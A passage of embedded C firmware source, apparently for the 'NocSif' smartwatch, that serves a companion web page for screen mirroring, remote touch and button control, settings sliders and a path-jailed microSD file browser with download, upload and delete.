".mrow{display:flex;align-items:center;justify-content:space-between;gap:8px;width:100%;background:#151519;"
"border:1px solid var(--edge);border-top:0;color:var(--ink);font:inherit;font-size:14px;"
"padding:12px 14px;cursor:pointer;text-align:left}.mrow:first-child{border-top:1px solid var(--edge)}"
".mrow:active{background:#1d1d24}.mrow.dim{color:#5a5a60;cursor:default}"
".mrow .rt{display:flex;align-items:center;gap:8px;flex:none}"
".mrow .rcar{color:var(--dim);font-size:12px;transition:transform .15s}.mrow.open>.rt .rcar{transform:rotate(90deg)}"
".mrow .wt{color:var(--warn);font-size:10px;border:1px solid var(--warn);border-radius:4px;padding:1px 5px}"
".sl{width:100%;margin:6px 0 14px;accent-color:var(--accent)}"
".slabel{font-size:12px;color:var(--dim);display:flex;justify-content:space-between}"
"#kbar{position:fixed;left:0;right:0;bottom:0;background:#191922;border-top:1px solid var(--accent);"
"padding:12px 16px;display:none;align-items:center;justify-content:space-between;gap:10px;"
"font-size:13px;color:var(--ink);z-index:9}#kbar.show{display:flex}#kbtap{flex:1;text-align:left}"
"#kbx{background:#26262a;border:1px solid var(--edge);border-radius:8px;color:var(--ink);font:inherit;padding:8px 14px}"
/* on-screen but invisible: iOS only raises the keyboard for a focus() on a visible, in-viewport input
 * (an off-screen one is ignored); pointer-events:none so it never steals taps from #kbar. 16px font
 * avoids the mobile auto-zoom. */
"#kb{position:fixed;left:0;bottom:0;width:100%;height:46px;opacity:0;font-size:16px;"
"pointer-events:none;border:0;z-index:8}"
/* live screen preview card (tap → full control stage). Canvas backing = frame px; CSS scales it. */
".mircard{display:flex;flex-direction:column;align-items:center;gap:8px;width:100%;background:var(--panel);"
"border:1px solid var(--edge);border-radius:12px;padding:14px;margin:6px 0 2px;cursor:pointer;font:inherit}"
".mircard:active{border-color:var(--accent)}"
"#mir{width:150px;height:auto;border-radius:16px;background:#000;border:1px solid var(--edge);"
"image-rendering:auto}"
".mirhint{font-size:11px;color:var(--dim);letter-spacing:.06em;text-transform:uppercase}"
/* full-screen interactive control stage */
"#stage{position:fixed;inset:0;background:#050506;z-index:20;display:none;flex-direction:column;"
"align-items:center;padding:8px 6px 12px}#stage.open{display:flex}"
".stagetop{display:flex;justify-content:space-between;width:100%;max-width:520px;margin-bottom:8px}"
/* exact watch aspect so touch maps 1:1 (no letterbox); the canvas backing fills it, CSS scales up */
"#mirbig{aspect-ratio:410/502;max-width:100%;max-height:calc(100vh - 168px);border-radius:26px;"
"background:#000;border:1px solid var(--edge);touch-action:none}"
".sbtns{display:flex;gap:14px;width:100%;max-width:520px;margin-top:12px}"
".sbtn{background:#1b1b21;border:1px solid var(--edge);border-radius:10px;color:var(--ink);font:inherit;"
"font-size:14px;padding:10px 16px;cursor:pointer;-webkit-tap-highlight-color:transparent;user-select:none}"
".sbtn.big{flex:1;padding:16px;font-size:16px}.sbtn:active{border-color:var(--accent);color:#fff}"
".sbtn.on{border-color:var(--accent);background:#241f38;color:#fff}"
/* P4 /sd file browser card */
".fbar{display:flex;align-items:center;gap:8px;margin-bottom:6px}"
"#fpath{flex:1;font-size:12px;color:var(--dim);word-break:break-all}"
".fbtn{background:#1b1b21;border:1px solid var(--edge);border-radius:8px;color:var(--ink);font:inherit;"
"font-size:12px;padding:7px 10px;cursor:pointer;flex:none;-webkit-tap-highlight-color:transparent}"
".fbtn:disabled{color:#5a5a60;border-color:#1f1f25}.fbtn:active{border-color:var(--accent)}"
".frow{display:flex;align-items:center;gap:8px;padding:9px 2px;border-bottom:1px solid var(--edge);"
"font-size:13px;cursor:pointer}.frow:last-child{border-bottom:0}.frow:active{background:#1a1a20}"
".frow .fn{flex:1;word-break:break-all}.frow.dir .fn{color:#e6e6ea}"
".frow.dir .fn:before{content:'\xE2\x96\xB8 ';color:var(--accent)}"
".frow .fs{color:var(--dim);font-size:11px;flex:none}"
".fdel{background:none;border:1px solid var(--edge);border-radius:6px;color:var(--dim);font:inherit;"
"font-size:11px;padding:3px 7px;flex:none;cursor:pointer}.fdel:active{border-color:var(--warn);color:var(--warn)}"
"#fprog{font-size:12px;color:var(--accent);margin-top:6px;min-height:14px;word-break:break-all}"
"</style></head><body><div class='wrap'>"
"<h1>NocSif</h1><div class='sub'><span class='dot' id='dot'></span><span id='stat'>connecting\xE2\x80\xA6</span></div>"
"<button class='mircard' id='mirbtn'><canvas id='mir' width='136' height='167'></canvas>"
"<div class='mirhint' id='mirhint'>tap for live control</div></button>"
"<div class='card'>"
"<div class='row'><span class='k'>device</span><span id='name'>\xE2\x80\x94</span></div>"
"<div class='row'><span class='k'>screen</span><span id='screen'>\xE2\x80\x94</span></div>"
"<div class='row'><span class='k'>battery</span><span id='batt'>\xE2\x80\x94</span></div>"
"<div class='row'><span class='k'>clients</span><span id='cli'>\xE2\x80\x94</span></div></div>"
"<div class='nav'><button class='btn' id='home'>Home</button><button class='btn' id='back'>Back</button></div>"
"<div id='menu'></div>"
"<div class='ct'>control center</div><div class='grid' id='toggles'>"
"<button class='btn' data-act='flash'>Flashlight</button>"
"<button class='btn' data-act='dnd'>Do Not Disturb</button>"
"<button class='btn' data-act='movie'>Movie</button></div>"
"<div class='card'>"
"<div class='slabel'>brightness <span id='brv'></span></div>"
"<input class='sl' id='br' type='range' min='24' max='255' value='200'>"
"<div class='slabel'>volume <span id='vov'></span></div>"
"<input class='sl' id='vo' type='range' min='0' max='255' value='170'></div>"
/* P4: the microSD browser — tap a folder to open it, a file to download it; upload into the current
 * folder; del removes one file after a confirm. */
"<div class='ct'>files</div><div class='card'>"
/* the upload control is a <label> for the file input (iOS Safari ignores a scripted .click() on a
 * display:none file input); the input itself stays in the layout but invisible (1px, opacity 0) */
"<div class='fbar'><span id='fpath'>/sd</span><button class='fbtn' id='fup'>\xE2\x86\x91 up</button>"
"<label class='fbtn' for='ffile'>upload</label></div>"
"<div id='flist'><div class='sub' style='margin:4px 0'>loading\xE2\x80\xA6</div></div><div id='fprog'></div>"
"<input type='file' id='ffile' style='position:absolute;width:1px;height:1px;opacity:0;overflow:hidden;"
"pointer-events:none'></div>"
"<div class='sub'>companion link \xC2\xB7 owner use \xC2\xB7 authorized testing only</div>"
"</div>"
"<div id='stage'>"
"<div class='stagetop'><button id='stclose' class='sbtn'>\xE2\x80\xB9 Back</button>"
"<button id='stcast' class='sbtn'>Cast (blank watch)</button></div>"
"<canvas id='mirbig' width='136' height='167'></canvas>"
"<div class='sbtns'><button id='btnfn' class='sbtn big'>FN</button>"
"<button id='btnpwr' class='sbtn big'>PWR</button></div>"
"<div class='sub' style='text-align:center;margin-top:8px'>tap \xC2\xB7 swipe \xC2\xB7 drag the dials "
"\xC2\xB7 hold FN/PWR for long-press</div></div>"
"<div id='kbar'><span id='kbtap'>watch field focused \xE2\x80\x94 tap to type</span><button id='kbx'>close</button></div>"
"<input id='kb' autocapitalize='off' autocomplete='off' autocorrect='off' spellcheck='false'>"
"<script>"
"function post(p,b){try{fetch(p,{method:'POST',headers:{'Content-Type':'application/json'},"
"body:b?JSON.stringify(b):null});}catch(e){}}"
"var $=function(id){return document.getElementById(id);};"
"$('home').onclick=function(){post('/api/home');};$('back').onclick=function(){post('/api/back');};"
"document.querySelectorAll('#toggles .btn').forEach(function(el){"
"el.onclick=function(){post('/api/launch',{id:el.dataset.act});};});"
"function launch(id,warn,label){"
"if(warn&&!confirm('\"'+label+'\" uses the radio and may drop this connection. Continue?'))return;"
"post('/api/launch',{id:id});}"
/* recursive render: a row with a nested "sub" array toggles its children (tree); a leaf launches */
"function renderRows(rows,box,depth){rows.forEach(function(r){"
"var sub=r.sub&&r.sub.length;"
"var b=document.createElement('button');b.className=(!r.en&&!sub)?'mrow dim':'mrow';"
"b.style.paddingLeft=(14+depth*14)+'px';"
"var w=r.warn?'<span class=\"wt\">radio</span>':'';"
"var car=sub?'<span class=\"rcar\">\xE2\x80\xBA</span>':'';"
"b.innerHTML='<span>'+r.label+'</span><span class=\"rt\">'+w+car+'</span>';"
"if(sub){var sbox=document.createElement('div');sbox.className='rows';renderRows(r.sub,sbox,depth+1);"
"b.onclick=function(){b.classList.toggle('open');sbox.classList.toggle('open');};"
"box.appendChild(b);box.appendChild(sbox);}"
"else{if(r.en){b.onclick=function(){launch(r.id,r.warn,r.label);};}box.appendChild(b);}});}"
"fetch('/api/menu',{cache:'no-store'}).then(function(r){return r.json();}).then(function(j){"
"var m=$('menu');(j.cats||[]).forEach(function(c){"
"var h=document.createElement('button');h.className='cat';"
"h.innerHTML='<span>'+c.label+'</span><span class=\"car\">\xE2\x80\xBA</span>';"
"var box=document.createElement('div');box.className='rows';"
"renderRows(c.rows||[],box,1);"
"h.onclick=function(){h.classList.toggle('open');box.classList.toggle('open');};"
"m.appendChild(h);m.appendChild(box);});}).catch(function(e){});"
"var br=$('br'),vo=$('vo'),brDrag=false,voDrag=false,brT=0,voT=0;"
"br.oninput=function(){$('brv').textContent=br.value;brDrag=true;"
"if(Date.now()-brT>120){brT=Date.now();post('/api/brightness',{v:+br.value});}};"
"br.onchange=function(){brDrag=false;post('/api/brightness',{v:+br.value});};"
"vo.oninput=function(){$('vov').textContent=vo.value;voDrag=true;"
"if(Date.now()-voT>120){voT=Date.now();post('/api/volume',{v:+vo.value});}};"
"vo.onchange=function(){voDrag=false;post('/api/volume',{v:+vo.value});};"
"var kb=$('kb'),kbar=$('kbar');"
"$('kbtap').onclick=function(){kb.focus();};"
"$('kbx').onclick=function(){kb.blur();kbar.classList.remove('show');};"
"kb.addEventListener('input',function(e){if(e.data){post('/api/type',{text:e.data});}kb.value='';});"
"kb.addEventListener('keydown',function(e){"
"if(e.key==='Enter'){e.preventDefault();post('/api/key',{key:'enter'});}"
"else if(e.key==='Backspace'){e.preventDefault();post('/api/key',{key:'backspace'});}});"
"var lastFocus=false;"
"function apply(j){"
"$('name').textContent=j.name||'\xE2\x80\x94';$('screen').textContent=j.screen||'\xE2\x80\x94';"
"$('batt').textContent=(j.batt|0)+'%';$('cli').textContent=j.clients|0;"
"var t=$('toggles').children;t[0].classList.toggle('on',!!j.flash);"
"t[1].classList.toggle('on',!!j.dnd);t[2].classList.toggle('on',!!j.movie);"
"if(!brDrag&&j.bright){br.value=j.bright;$('brv').textContent=j.bright;}"
"if(!voDrag&&j.vol!=null){vo.value=j.vol;$('vov').textContent=j.vol;}"
"if(j.focused&&!lastFocus){kbar.classList.add('show');}"
"if(!j.focused&&lastFocus){kbar.classList.remove('show');kb.blur();}"
"lastFocus=!!j.focused;}"
"function online(o){$('dot').classList.toggle('off',!o);"
"$('stat').textContent=o?'companion control surface \xC2\xB7 connected':'reconnecting\xE2\x80\xA6';}"
/* live screen mirror: decode a binary RGB565-LE frame (8-byte header 'N','F',w16,h16,fmt,rsv) to canvas */
"function drawThumb(buf){var dv=new DataView(buf);"
"if(dv.byteLength<8||dv.getUint8(0)!==78||dv.getUint8(1)!==70)return;"
"var w=dv.getUint16(2,true),h=dv.getUint16(4,true);if(dv.byteLength<8+w*h*2)return;"
"var cv=curCanvas;if(cv.width!==w){cv.width=w;cv.height=h;}var ctx=cv.getContext('2d');"
"var img=ctx.createImageData(w,h),d=img.data,o=8;"
"for(var p=0;p<w*h;p++){var px=dv.getUint16(o,true);o+=2;"
"var r=(px>>11)&31,g=(px>>5)&63,b=px&31,q=p*4;"
"d[q]=(r<<3)|(r>>2);d[q+1]=(g<<2)|(g>>4);d[q+2]=(b<<3)|(b>>2);d[q+3]=255;}"
"ctx.putImageData(img,0,0);$('mirhint').textContent='live screen';}"
"var ws,poll;"
"function startWs(){try{ws=new WebSocket('ws://'+location.host+'/ws');ws.binaryType='arraybuffer';"
"ws.onopen=function(){online(true);if(poll){clearInterval(poll);poll=null;}};"
"ws.onmessage=function(ev){if(typeof ev.data==='string'){try{apply(JSON.parse(ev.data));}catch(e){}}"
"else{drawThumb(ev.data);}};"
"ws.onclose=function(){online(false);startPoll();setTimeout(startWs,3000);};"
"ws.onerror=function(){try{ws.close();}catch(e){}};}catch(e){startPoll();}}"
"function startPoll(){if(poll)return;poll=setInterval(function(){"
"fetch('/api/ping',{cache:'no-store'}).then(function(r){return r.json();})"
".then(function(j){online(true);apply(j);}).catch(function(e){online(false);});},2000);}"
/* ===== interactive control stage: full-screen mirror + touch/button uplink over WS ===== */
"var curCanvas=$('mir');"
"function wsSend(o){try{if(ws&&ws.readyState===1)ws.send(JSON.stringify(o));}catch(e){}}"
"var stage=$('stage'),big=$('mirbig'),castOn=false;"
"$('mirbtn').onclick=function(){stage.classList.add('open');curCanvas=big;};"
"function closeStage(){stage.classList.remove('open');curCanvas=$('mir');"
"if(castOn){castOn=false;$('stcast').classList.remove('on');$('stcast').textContent='Cast (blank watch)';wsSend({t:'c',on:0});}}"
"$('stclose').onclick=closeStage;"
"$('stcast').onclick=function(){castOn=!castOn;this.classList.toggle('on',castOn);"
"this.textContent=castOn?'Casting \xE2\x80\x94 tap to stop':'Cast (blank watch)';wsSend({t:'c',on:castOn?1:0});};"
"var WT_W=410,WT_H=502,drag=false,tLast=0;"
"function sendTouch(ev,st){var r=big.getBoundingClientRect();"
"var x=Math.round((ev.clientX-r.left)/r.width*WT_W),y=Math.round((ev.clientY-r.top)/r.height*WT_H);"
"if(x<0)x=0;if(x>WT_W-1)x=WT_W-1;if(y<0)y=0;if(y>WT_H-1)y=WT_H-1;wsSend({t:'m',x:x,y:y,s:st});}"
"big.addEventListener('pointerdown',function(e){e.preventDefault();drag=true;"
"try{big.setPointerCapture(e.pointerId);}catch(x){}sendTouch(e,1);});"
"big.addEventListener('pointermove',function(e){if(!drag)return;var n=Date.now();if(n-tLast<25)return;tLast=n;sendTouch(e,1);});"
"big.addEventListener('pointerup',function(e){if(!drag)return;drag=false;sendTouch(e,0);});"
"big.addEventListener('pointercancel',function(e){if(!drag)return;drag=false;sendTouch(e,0);});"
"function wireBtn(id,k){var el=$(id),tmr=null,lng=false;"
"el.addEventListener('pointerdown',function(e){e.preventDefault();lng=false;"
"tmr=setTimeout(function(){lng=true;wsSend({t:'b',k:k,a:'l'});},500);});"
"el.addEventListener('pointerup',function(){if(tmr){clearTimeout(tmr);tmr=null;}if(!lng)wsSend({t:'b',k:k,a:'s'});lng=false;});"
"el.addEventListener('pointerleave',function(){if(tmr){clearTimeout(tmr);tmr=null;}});}"
"wireBtn('btnfn','fn');wireBtn('btnpwr','pwr');"
/* ===== P4 /sd file browser: list / download / upload / delete over the companion server ===== */
"var fcur='/sd';"
"function esc(s){return String(s).replace(/[&<>\"]/g,function(c){return c==='&'?'&amp;':c==='<'?'&lt;':c==='>'?'&gt;':'&quot;';});}"
"function fsz(n){return n<1024?n+' B':n<1048576?(n/1024).toFixed(1)+' KB':(n/1048576).toFixed(2)+' MB';}"
"function fnote(t){$('flist').innerHTML='<div class=\"sub\" style=\"margin:4px 0\">'+esc(t)+'</div>';}"
"function fdl(full,name){var a=document.createElement('a');a.href='/api/file?p='+encodeURIComponent(full);"
"a.download=name;document.body.appendChild(a);a.click();a.remove();}"
"function fdel(full,name){if(!confirm('Delete \"'+name+'\" from the card?'))return;"
"fetch('/api/delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({p:full})})"
".then(function(r){return r.json();}).then(function(j){$('fprog').textContent=j.err||'';fload(fcur);}).catch(function(){});}"
"function fload(p){fetch('/api/fs?p='+encodeURIComponent(p),{cache:'no-store'}).then(function(r){return r.json();})"
".then(function(j){if(j.err){fnote(j.err);return;}fcur=j.path;$('fpath').textContent=fcur;$('fup').disabled=(fcur==='/sd');"
"var box=$('flist');box.innerHTML='';var ents=j.ents||[];"
"ents.forEach(function(e){var d=document.createElement('div');d.className=e.d?'frow dir':'frow';var full=fcur+'/'+e.n;"
"if(e.d){d.innerHTML='<span class=\"fn\">'+esc(e.n)+'</span><span class=\"fs\">\xE2\x80\xBA</span>';d.onclick=function(){fload(full);};}"
"else{d.innerHTML='<span class=\"fn\">'+esc(e.n)+'</span><span class=\"fs\">'+fsz(e.s)+'</span><button class=\"fdel\">del</button>';"
"d.onclick=function(){fdl(full,e.n);};"
"d.querySelector('.fdel').onclick=function(ev){ev.stopPropagation();fdel(full,e.n);};}"
"box.appendChild(d);});"
"if(!ents.length)fnote('empty folder');"
"if(j.trunc){var t=document.createElement('div');t.className='sub';t.style.margin='6px 0 0';"
"t.textContent='showing the first '+ents.length+' entries';box.appendChild(t);}"
"}).catch(function(){fnote('files unavailable');});}"
"$('fup').onclick=function(){var i=fcur.lastIndexOf('/');fload(i>3?fcur.substring(0,i):'/sd');};"
"$('ffile').onchange=function(){var f=this.files[0];if(!f)return;this.value='';"
"var x=new XMLHttpRequest();x.open('POST','/api/upload?p='+encodeURIComponent(fcur)+'&n='+encodeURIComponent(f.name));"
"x.upload.onprogress=function(e){if(e.lengthComputable)$('fprog').textContent='uploading '+f.name+' \xC2\xB7 '+Math.round(e.loaded*100/e.total)+'%';};"
"x.onload=function(){var m='';if(x.status!==200){try{m=JSON.parse(x.responseText).err;}catch(e){}m='upload failed: '+(m||x.status);}"
"$('fprog').textContent=m;fload(fcur);};"
"x.onerror=function(){$('fprog').textContent='upload failed';};"
"$('fprog').textContent='uploading '+f.name+'\xE2\x80\xA6';x.send(f);};"
"fload('/sd');"
"startWs();startPoll();"
"</script></body></html>";

static esp_err_t comp_root_get(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, COMP_PAGE_HTML, HTTPD_RESP_USE_STRLEN);
}

static esp_err_t comp_ping_get(httpd_req_t *req)
{
    char js[512];
    httpd_resp_set_type(req, "application/json");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    if (s_comp_state_fn) {                 /* P3: the full live-state snapshot (same shape as /ws) */
        js[0] = '\0';
        s_comp_state_fn(js, sizeof js);
        if (js[0]) return httpd_resp_sendstr(req, js);
    }
    int n = snprintf(js, sizeof js,        /* fallback before the UI registers its state provider */
                     "{\"name\":\"%s\",\"batt\":%d,\"uptime\":%lld,\"clients\":%d}",
                     nocsif_settings_device_name(), nocsif_power_batt_pct(),
                     (long long)(esp_timer_get_time() / 1000000),
                     s_ap_active ? nocsif_wifi_ap_client_count() : 0);
    return httpd_resp_send(req, js, n);
}

/* ---- P2 command channel (phone -> watch) ------------------------------------------------- *
 * Each POST handler runs on the httpd task: read the small JSON body, fill a nocsif_companion_cmd_t,
 * and forward it to the UI-registered handler (which marshals onto the LVGL task). All fire-and-forget
 * (reply {"ok":true} immediately); no LVGL is touched here. Every command is ESP_LOGI'd — the
 * reliability A2 log tee records it to the persistent logbook ring. */
static esp_err_t comp_read_body(httpd_req_t *req, char *buf, size_t len)
{
    int total = req->content_len;
    if (total < 0) total = 0;
    if ((size_t)total >= len) total = (int)len - 1;
    int got = 0;
    while (got < total) {
        int r = httpd_req_recv(req, buf + got, total - got);
        if (r == HTTPD_SOCK_ERR_TIMEOUT) continue;
        if (r <= 0) break;
        got += r;
    }
    buf[got] = '\0';
    return ESP_OK;
}

static esp_err_t comp_reply(httpd_req_t *req, bool ok)
{
    if (!ok) httpd_resp_set_status(req, "400 Bad Request");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    return httpd_resp_sendstr(req, ok ? "{\"ok\":true}" : "{\"ok\":false}");
}

/* Extract a string field from a JSON body into out. False if absent / not a string. */
static bool comp_json_str(const char *body, const char *key, char *out, size_t len)
{
    bool ok = false;
    cJSON *root = cJSON_Parse(body);
    if (root) {
        cJSON *it = cJSON_GetObjectItem(root, key);
        if (cJSON_IsString(it) && it->valuestring) {
            snprintf(out, len, "%s", it->valuestring);
            ok = true;
        }
        cJSON_Delete(root);
    }
    return ok;
}

/* Extract an integer field (accepts a JSON number or a numeric string) into *out. */
static bool comp_json_int(const char *body, const char *key, int *out)
{
    bool ok = false;
    cJSON *root = cJSON_Parse(body);
    if (root) {
        cJSON *it = cJSON_GetObjectItem(root, key);
        if (cJSON_IsNumber(it))                       { *out = (int)it->valuedouble; ok = true; }
        else if (cJSON_IsString(it) && it->valuestring){ *out = atoi(it->valuestring); ok = true; }
        cJSON_Delete(root);
    }
    return ok;
}

/* Fill a command and hand it to the UI (if registered + companion is up). */
static void comp_dispatch(nocsif_companion_cmd_type_t type, const char *arg)
{
    nocsif_companion_cmd_t cmd = { .type = type };
    if (arg) snprintf(cmd.arg, sizeof cmd.arg, "%s", arg);
    ESP_LOGI(TAG, "companion cmd: type=%d arg=\"%s\"", (int)type, cmd.arg);
    if (s_comp_active && s_comp_cmd_fn) {
        s_comp_cmd_fn(&cmd);
    }
}

static esp_err_t comp_launch_post(httpd_req_t *req)
{
    char body[256]; comp_read_body(req, body, sizeof body);
    char id[96];
    if (!comp_json_str(body, "id", id, sizeof id)) return comp_reply(req, false);
    comp_dispatch(NOCSIF_COMPANION_CMD_LAUNCH, id);
    return comp_reply(req, true);
}

static esp_err_t comp_type_post(httpd_req_t *req)
{
    char body[256]; comp_read_body(req, body, sizeof body);
    char text[192];
    if (!comp_json_str(body, "text", text, sizeof text)) return comp_reply(req, false);
    comp_dispatch(NOCSIF_COMPANION_CMD_TYPE, text);
    return comp_reply(req, true);
}

static esp_err_t comp_key_post(httpd_req_t *req)
{
    char body[128]; comp_read_body(req, body, sizeof body);
    char key[24];
    if (!comp_json_str(body, "key", key, sizeof key)) return comp_reply(req, false);
    comp_dispatch(NOCSIF_COMPANION_CMD_KEY, key);
    return comp_reply(req, true);
}

static esp_err_t comp_back_post(httpd_req_t *req)
{
    comp_dispatch(NOCSIF_COMPANION_CMD_BACK, NULL);
    return comp_reply(req, true);
}

static esp_err_t comp_home_post(httpd_req_t *req)
{
    comp_dispatch(NOCSIF_COMPANION_CMD_HOME, NULL);
    return comp_reply(req, true);
}

/* Both sliders carry a 0-255 level; dispatch it as a decimal string (the async UI side clamps). */
static esp_err_t comp_level_post(httpd_req_t *req, nocsif_companion_cmd_type_t type)
{
    char body[64]; comp_read_body(req, body, sizeof body);
    int v;
    if (!comp_json_int(body, "v", &v)) return comp_reply(req, false);
    if (v < 0) v = 0; if (v > 255) v = 255;
    char arg[8]; snprintf(arg, sizeof arg, "%d", v);
    comp_dispatch(type, arg);
    return comp_reply(req, true);
}
static esp_err_t comp_brightness_post(httpd_req_t *req) { return comp_level_post(req, NOCSIF_COMPANION_CMD_BRIGHTNESS); }
static esp_err_t comp_volume_post(httpd_req_t *req)     { return comp_level_post(req, NOCSIF_COMPANION_CMD_VOLUME); }

/* GET /api/menu — the watch's live menu tree (3 Home categories → their real rows). The UI fills the
 * JSON from its screen registry (immutable after init) so the page mirrors the device, never a
 * hardcoded grid. Sent chunked-free from a heap buffer (the tree is ~1.5 KB). */
static esp_err_t comp_menu_get(httpd_req_t *req)
{
    httpd_resp_set_type(req, "application/json");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    if (!s_comp_menu_fn) return httpd_resp_sendstr(req, "{\"cats\":[]}");
    enum { COMP_MENU_BUF = 8192 };   /* full nested map (~100 nodes) fits with headroom */
    char *js = malloc(COMP_MENU_BUF);
    if (!js) return httpd_resp_send_500(req);
    js[0] = '\0';
    s_comp_menu_fn(js, COMP_MENU_BUF);
    esp_err_t r = httpd_resp_sendstr(req, js);
    free(js);
    return r;
}

/* ---- P4 /sd file browser (folds in PLAN §4.8 "wireless file download from SD") ---------------- *
 *   GET  /api/fs?p=<dir>             JSON {path, ents:[{n,d,s}], trunc} — dirs first, dotfiles hidden
 *   GET  /api/file?p=<file>          the file (chunked; Content-Disposition attachment; X-File-Size)
 *   POST /api/upload?p=<dir>&n=<nm>  raw body → <dir>/<nm> (written to .part, renamed on completion)
 *   POST /api/delete {"p":<file>}    remove ONE regular file (never a directory)
 * All run on the httpd task (PSRAM stack, see companion_httpd_up). Card rules mirror the on-watch Files
 * screen + the §4.10 download: CLAIM the card for the request (refused with the reason while File Share
 * has the drive), take the FAT lock only around each readdir / 8 KB chunk so the rest of the watch keeps
 * its short card accesses, and never hold the lock across a socket send. Paths are JAILED to /sd:
 * absolute, no "." / ".." segment, no empty segment, no control chars or backslashes, length-capped.
 * Mirror frames queue behind a transfer (one httpd task) and resume after it — expected.
 * §4.15: the jail / claim / listing rules moved to sdfs.{h,c} so the desktop bridge shares them. */
#define COMP_FS_CHUNK     8192                  /* read/write unit under one short card lock */

static esp_err_t comp_fs_err(httpd_req_t *req, const char *status, const char *msg)
{
    httpd_resp_set_status(req, status);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    char js[160];
    snprintf(js, sizeof js, "{\"err\":\"%s\"}", msg);
    return httpd_resp_sendstr(req, js);
}

/* Query-string value decoding (%XX and '+'). False if the decoded value would not fit. */
static bool comp_url_decode(const char *in, char *out, size_t len)
{
    size_t o = 0;
    for (const char *p = in; *p; p++) {
        char c = *p;
        if (c == '+') {
            c = ' ';
        } else if (c == '%' && isxdigit((unsigned char)p[1]) && isxdigit((unsigned char)p[2])) {
            char hex[3] = { p[1], p[2], 0 };
            c = (char)strtol(hex, NULL, 16);
            p += 2;
        }
        if (o + 1 >= len) return false;
        out[o++] = c;
    }
    out[o] = '\0';
    return true;
}

/* One decoded query value. False if absent, truncated, or too long for out. */
static bool comp_query(httpd_req_t *req, const char *key, char *out, size_t len)
{
    char q[CONFIG_HTTPD_MAX_URI_LEN + 1];
    char enc[CONFIG_HTTPD_MAX_URI_LEN + 1];
    if (httpd_req_get_url_query_str(req, q, sizeof q) != ESP_OK) return false;
    if (httpd_query_key_value(q, key, enc, sizeof enc) != ESP_OK) return false;
    return comp_url_decode(enc, out, len);
}

static void comp_json_escape(const char *in, char *out, size_t len)
{
    size_t o = 0;
    for (; *in && o + 2 < len; in++) {
        unsigned char c = (unsigned char)*in;
        if (c == '"' || c == '\\') { out[o++] = '\\'; out[o++] = (char)c; }
        else if (c < 0x20)         { out[o++] = ' '; }
        else                       { out[o++] = (char)c; }
    }
    out[o] = '\0';
}

/* GET /api/fs?p=<dir> — snapshot the directory (sdfs: claim + short lock), then stream the JSON in
 * chunks with nothing held. */
static esp_err_t comp_fs_list_get(httpd_req_t *req)
{
    char path[NOCSIF_SDFS_PATH_MAX];
    if (!comp_query(req, "p", path, sizeof path)) snprintf(path, sizeof path, "%s", NOCSIF_SDFS_ROOT);
    if (!nocsif_sdfs_path_ok(path, true)) return comp_fs_err(req, "400 Bad Request", "bad path");

    nocsif_sdfs_ent_t *ents = heap_caps_calloc(NOCSIF_SDFS_LIST_MAX, sizeof *ents, MALLOC_CAP_SPIRAM);
    if (!ents) return comp_fs_err(req, "500 Internal Server Error", "out of memory");
    int  n = 0;
    bool trunc = false;
    const char *why = nocsif_sdfs_list(path, ents, NOCSIF_SDFS_LIST_MAX, &n, &trunc);
    if (why) {
        free(ents);
        return comp_fs_err(req, strcmp(why, "folder unavailable") == 0 ? "404 Not Found" : "503 Service Unavailable", why);
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    char esc[NOCSIF_SDFS_PATH_MAX * 2];
    char line[NOCSIF_SDFS_PATH_MAX * 2 + 64];
    comp_json_escape(path, esc, sizeof esc);
    int len = snprintf(line, sizeof line, "{\"path\":\"%s\",\"ents\":[", esc);
    esp_err_t r = httpd_resp_send_chunk(req, line, len);
    for (int i = 0; i < n && r == ESP_OK; i++) {
        comp_json_escape(ents[i].name, esc, sizeof esc);
        len = snprintf(line, sizeof line, "%s{\"n\":\"%s\",\"d\":%d,\"s\":%u}",
                       i ? "," : "", esc, ents[i].is_dir ? 1 : 0, (unsigned)ents[i].size);
        r = httpd_resp_send_chunk(req, line, len);
    }
    if (r == ESP_OK) {
        len = snprintf(line, sizeof line, "],\"trunc\":%s}", trunc ? "true" : "false");
        r = httpd_resp_send_chunk(req, line, len);
    }
    if (r == ESP_OK) r = httpd_resp_send_chunk(req, NULL, 0);
    free(ents);
    return r;
}

/* GET /api/file?p=<file> — stream the file 8 KB at a time, each read under its own short card lock. */
static esp_err_t comp_fs_file_get(httpd_req_t *req)
{
    char path[NOCSIF_SDFS_PATH_MAX];
    if (!comp_query(req, "p", path, sizeof path) || !nocsif_sdfs_path_ok(path, false)) {
        return comp_fs_err(req, "400 Bad Request", "bad path");
    }
    const char *why = nocsif_sdfs_claim();
    if (why) return comp_fs_err(req, "503 Service Unavailable", why);

    FILE *f = NULL;
    struct stat st = { 0 };
    if (nocsif_sdcard_lock(1500)) {
        if (stat(path, &st) == 0 && S_ISREG(st.st_mode)) f = fopen(path, "rb");
        nocsif_sdcard_unlock();
    }
    if (!f) { nocsif_usb_gadget_release_sd(); return comp_fs_err(req, "404 Not Found", "no such file"); }
    uint8_t *buf = heap_caps_malloc(COMP_FS_CHUNK, MALLOC_CAP_SPIRAM);
    if (!buf) {
        if (nocsif_sdcard_lock(1500)) { fclose(f); nocsif_sdcard_unlock(); } else { fclose(f); }
        nocsif_usb_gadget_release_sd();
        return comp_fs_err(req, "500 Internal Server Error", "out of memory");
    }

    /* Header values are referenced (not copied) by httpd until the first chunk goes out — keep them in
     * this frame. A '"' in a name would break the header; the client names the download anyway. */
    const char *name = strrchr(path, '/');
    name = name ? name + 1 : path;
    char cd[NOCSIF_SDFS_NAME_MAX + 40], szs[24];
    snprintf(cd, sizeof cd, "attachment; filename=\"%s\"", name);
    for (char *q = cd + 22; *q; q++) if (*q == '"' && q[1] != '\0') *q = '_';
    snprintf(szs, sizeof szs, "%lu", (unsigned long)st.st_size);
    httpd_resp_set_type(req, nocsif_sdfs_mime(name));
    httpd_resp_set_hdr(req, "Content-Disposition", cd);
    httpd_resp_set_hdr(req, "X-File-Size", szs);
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
